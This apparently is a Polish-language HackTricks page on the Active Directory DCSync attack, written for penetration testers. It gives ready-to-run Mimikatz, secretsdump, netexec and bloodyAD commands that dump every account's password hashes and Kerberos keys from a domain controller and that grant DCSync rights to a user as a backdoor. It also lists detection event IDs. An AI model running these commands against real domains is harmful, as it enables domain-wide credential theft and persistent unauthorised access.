# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Uprawnienie **DCSync** oznacza posiadanie następujących uprawnień względem samej domeny: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** oraz **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Ważne uwagi dotyczące DCSync:**

- **Atak DCSync symuluje działanie kontrolera domeny i żąda od innych kontrolerów domeny replikacji informacji** za pomocą Directory Replication Service Remote Protocol (MS-DRSR). Ponieważ MS-DRSR jest prawidłową i niezbędną funkcją Active Directory, nie można go wyłączyć ani dezaktywować.
- Domyślnie tylko grupy **Domain Admins, Enterprise Admins, Administrators oraz Domain Controllers** mają wymagane uprawnienia.
- W praktyce **pełny DCSync** wymaga uprawnień **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** w kontekście nazewniczym domeny. `DS-Replication-Get-Changes-In-Filtered-Set` jest często delegowane razem z nimi, ale samodzielnie ma większe znaczenie przy synchronizowaniu **poufnych atrybutów / atrybutów filtrowanych przez RODC** (na przykład sekretów w stylu starszego LAPS) niż przy pełnym zrzucie krbtgt.<sup>[[2]](#references)</sup>
- Jeśli hasła któregokolwiek konta są przechowywane z użyciem szyfrowania odwracalnego, w Mimikatz dostępna jest opcja zwrócenia hasła w postaci jawnego tekstu

### Enumeracja

Sprawdź, kto ma te uprawnienia, używając `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Jeśli chcesz skupić się na **niestandardowych podmiotach** z uprawnieniami DCSync, odfiltruj wbudowane grupy mające możliwość replikacji i przeanalizuj tylko nieoczekiwanych podmiotów uprawnionych:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit lokalnie
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Eksploatuj zdalnie
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktyczne przykłady o określonym zakresie:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync przy użyciu przechwyconego TGT maszyny DC (ccache)

W scenariuszach `export-mode` z unconstrained delegation możesz przechwycić TGT maszyny Domain Controller (np. `DC1$@DOMAIN` dla `krbtgt@DOMAIN`). Następnie możesz użyć tego ccache do uwierzytelnienia jako DC i wykonania DCSync bez hasła.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notatki operacyjne:

- **Ścieżka Kerberos w Impacket najpierw wykonuje żądanie SMB**, a dopiero potem wywołanie DRSUAPI. Jeśli środowisko wymusza **SPN target name validation**, pełny dump może zakończyć się niepowodzeniem z komunikatem `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- W takim przypadku najpierw zażądaj **`cifs/<dc>`** service ticket dla docelowego DC albo użyj **`-just-dc-user`** dla konta, którego potrzebujesz od razu.
- Jeśli masz tylko niższe uprawnienia replikacji, synchronizacja w stylu LDAP/DirSync nadal może ujawnić **confidential** lub **RODC-filtered** atrybuty (na przykład starszy `ms-Mcs-AdmPwd`) bez pełnej replikacji krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` generuje 3 pliki:

- jeden z **hashami NTLM**
- jeden z **kluczami Kerberos**
- jeden z hasłami w jawnym tekście z NTDS dla wszystkich kont, dla których włączono [**szyfrowanie odwracalne**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Użytkowników z szyfrowaniem odwracalnym można uzyskać za pomocą

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Jeśli jesteś administratorem domeny, możesz nadać te uprawnienia dowolnemu użytkownikowi za pomocą PowerView:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Operatorzy Linuksa mogą zrobić to samo za pomocą `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Następnie możesz **sprawdzić, czy użytkownikowi poprawnie przypisano** 3 uprawnienia, wyszukując je w wynikach (powinieneś móc zobaczyć nazwy uprawnień w polu "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigacja

- Security Event ID 4662 (Audit Policy for object must be enabled) – Wykonano operację na obiekcie<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – Zmodyfikowano obiekt usługi katalogowej
- Security Event ID 4670 (Audit Policy for object must be enabled) – Zmieniono uprawnienia obiektu
- AD ACL Scanner - Twórz i porównuj raporty ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Dziennik zmian Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Wykorzystanie replikacji Get-Changes i Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Zrzucanie hashy haseł z kontrolera domeny](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
